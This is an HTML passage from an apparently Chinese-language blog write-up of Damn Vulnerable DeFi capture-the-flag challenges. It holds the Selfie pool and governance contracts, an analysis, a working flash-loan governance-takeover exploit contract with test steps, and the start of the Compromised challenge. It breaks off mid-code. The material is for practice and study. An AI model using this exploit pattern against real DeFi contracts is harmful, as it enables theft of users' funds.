builtin\">uint256</span> balanceBefore <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceBefore <span class=\"token operator\">>=</span> borrowAmount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough tokens in pool\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        \n        \n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">isContract</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Sender must be a deployed contract\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">functionCall</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string\">\"receiveTokens(address,uint256)\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                borrowAmount\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token builtin\">uint256</span> balanceAfter <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceAfter <span class=\"token operator\">>=</span> balanceBefore<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Flash loan hasn't been paid back\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">drainAllFunds</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyGovernance <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> amount <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>receiver<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">emit</span> <span class=\"token function\">FundsDrained</span><span class=\"token punctuation\">(</span>receiver<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"SimpleGovernance-code\"><a href=\"#SimpleGovernance-code\" class=\"headerlink\" title=\"SimpleGovernance code\"></a><strong>SimpleGovernance</strong> code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableTokenSnapshot.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title SimpleGovernance\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SimpleGovernance</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">GovernanceAction</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes</span> data<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> weiAmount<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> proposedAt<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> executedAt<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    DamnValuableTokenSnapshot <span class=\"token keyword\">public</span> governanceToken<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> <span class=\"token operator\">=></span> GovernanceAction<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> actions<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> actionCounter<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> ACTION_DELAY_IN_SECONDS <span class=\"token operator\">=</span> <span class=\"token number\">2</span> days<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">ActionQueued</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> caller<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">ActionExecuted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> caller<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> governanceTokenAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>governanceTokenAddress <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Governance token cannot be zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        governanceToken <span class=\"token operator\">=</span> <span class=\"token function\">DamnValuableTokenSnapshot</span><span class=\"token punctuation\">(</span>governanceTokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        actionCounter <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">queueAction</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> data<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> weiAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">_hasEnoughVotes</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough votes to propose an action\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>receiver <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot queue actions that affect Governance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> actionId <span class=\"token operator\">=</span> actionCounter<span class=\"token punctuation\">;</span>\n\n        GovernanceAction <span class=\"token keyword\">storage</span> actionToQueue <span class=\"token operator\">=</span> actions<span class=\"token punctuation\">[</span>actionId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>receiver <span class=\"token operator\">=</span> receiver<span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>weiAmount <span class=\"token operator\">=</span> weiAmount<span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>proposedAt <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n\n        actionCounter<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">ActionQueued</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> actionId<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">executeAction</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">_canBeExecuted</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot execute this action\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        GovernanceAction <span class=\"token keyword\">storage</span> actionToExecute <span class=\"token operator\">=</span> actions<span class=\"token punctuation\">[</span>actionId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        actionToExecute<span class=\"token punctuation\">.</span>executedAt <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n\n        actionToExecute<span class=\"token punctuation\">.</span>receiver<span class=\"token punctuation\">.</span><span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>\n            actionToExecute<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">,</span>\n            actionToExecute<span class=\"token punctuation\">.</span>weiAmount\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">ActionExecuted</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getActionDelay</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> ACTION_DELAY_IN_SECONDS<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev an action can only be executed if:\n     * 1) it's never been executed before and\n     * 2) enough time has passed since it was first proposed\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_canBeExecuted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        GovernanceAction <span class=\"token keyword\">memory</span> actionToExecute <span class=\"token operator\">=</span> actions<span class=\"token punctuation\">[</span>actionId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n            actionToExecute<span class=\"token punctuation\">.</span>executedAt <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span>\n            <span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">-</span> actionToExecute<span class=\"token punctuation\">.</span>proposedAt <span class=\"token operator\">>=</span> ACTION_DELAY_IN_SECONDS<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">_hasEnoughVotes</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> balance <span class=\"token operator\">=</span> governanceToken<span class=\"token punctuation\">.</span><span class=\"token function\">getBalanceAtLastSnapshot</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> halfTotalSupply <span class=\"token operator\">=</span> governanceToken<span class=\"token punctuation\">.</span><span class=\"token function\">getTotalSupplyAtLastSnapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> balance <span class=\"token operator\">></span> halfTotalSupply<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze-5\"><a href=\"#analyze-5\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>函数发现call调用并且data可控，猜测漏洞在此产生。</p>\n<p>drainAllFunds()函数可以取走全部的dvt，但是函数限制onlyGovernance。所以只要通过令SimpleGovernance合约主动调用池子合约下的drainAllFunds()函数即可</p>\n<p>先通过falshloan()借出全部的token，从而满足_hasEnoughVotes()下的balance &gt; halfTotalSupply，但是在此之前要先调用token的snapshot()函数，否则再balance将会返回值0.</p>\n<p>调用queueAction()函数，设置receiver为pool合约，data为调用drainAllFunds(attacker)函数的abi编码。</p>\n<p>然后再调用executeAction()函数触发call调用。调用后将借出的token返还即可</p>\n<h2 id=\"attack-5\"><a href=\"#attack-5\" class=\"headerlink\" title=\"attack\"></a>attack</h2><p>attackcontract</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">ERC20Snapshot1</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">SelfiePool1</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">SimpleGovernance1</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">queueAction</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> <span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">DamnValuableTokenSnapshot1</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">snapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SelfieAttacker</span> <span class=\"token punctuation\">&#123;</span>\n\n    ERC20Snapshot1 <span class=\"token keyword\">public</span> token<span class=\"token punctuation\">;</span>\n    SelfiePool1 <span class=\"token keyword\">private</span> immutable pool<span class=\"token punctuation\">;</span>\n    SimpleGovernance1 <span class=\"token keyword\">private</span> immutable governance<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> attacker<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> actionId<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> poolAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> governanceAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> attackerAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        token <span class=\"token operator\">=</span> <span class=\"token function\">ERC20Snapshot1</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool <span class=\"token operator\">=</span> <span class=\"token function\">SelfiePool1</span><span class=\"token punctuation\">(</span>poolAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        governance <span class=\"token operator\">=</span> <span class=\"token function\">SimpleGovernance1</span><span class=\"token punctuation\">(</span>governanceAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        attacker <span class=\"token operator\">=</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>attackerAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Take the max amount of flash loan from the pool, take governance over, queue an action that drains all funds</span>\n    <span class=\"token comment\">// from the pool, advance 2 days in time, execute action</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        DamnValuableTokenSnapshot1 governanceToken <span class=\"token operator\">=</span> <span class=\"token function\">DamnValuableTokenSnapshot1</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        governanceToken<span class=\"token punctuation\">.</span><span class=\"token function\">snapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        actionId <span class=\"token operator\">=</span> governance<span class=\"token punctuation\">.</span><span class=\"token function\">queueAction</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"drainAllFunds(address)\"</span><span class=\"token punctuation\">,</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">const SelfieAttackerFactory &#x3D; await ethers.getContractFactory(&#39;SelfieAttacker&#39;, deployer);\n       const attackerContract &#x3D; await SelfieAttackerFactory.deploy(this.token.address, this.pool.address, this.governance.address, attacker.address);\n       await attackerContract.connect(attacker).attack(TOKENS_IN_POOL);\n       const actionId &#x3D; ethers.BigNumber.from(await attackerContract.connect(attacker).actionId());\n       expect(actionId).to.be.gt(0);\n\n       await ethers.provider.send(&quot;evm_increaseTime&quot;, [2 * 24 * 60 * 60]); &#x2F;&#x2F; Advance in time 2 days\n       await this.governance.connect(attacker).executeAction(actionId);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h1 id=\"7-Compromised\"><a href=\"#7-Compromised\" class=\"headerlink\" title=\"7.Compromised\"></a>7.Compromised</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:</p></blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">HTTP&#x2F;2 200 OK\ncontent-type: text&#x2F;html\ncontent-language: en\nvary: Accept-Encoding\nserver: cloudflare\n\n4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35\n\n4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34\n        <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each</p>\n<p>This price is fetched from an on-chain oracle, and is based on three trusted reporters: <code>0xA73209FB1a42495120166736362A1DfA9F95A105</code>,<code>0xe92401A4d3af5E446d93D11EEc806b1462b39D15</code> and <code>0x81A5D6E50C214044bE44cA0CB057fe119097850c</code>.</p>\n<p>Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.</p>\n<h2 id=\"Exchange-code\"><a href=\"#Exchange-code\" class=\"headerlink\" title=\"Exchange code\"></a><strong>Exchange</strong> code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span 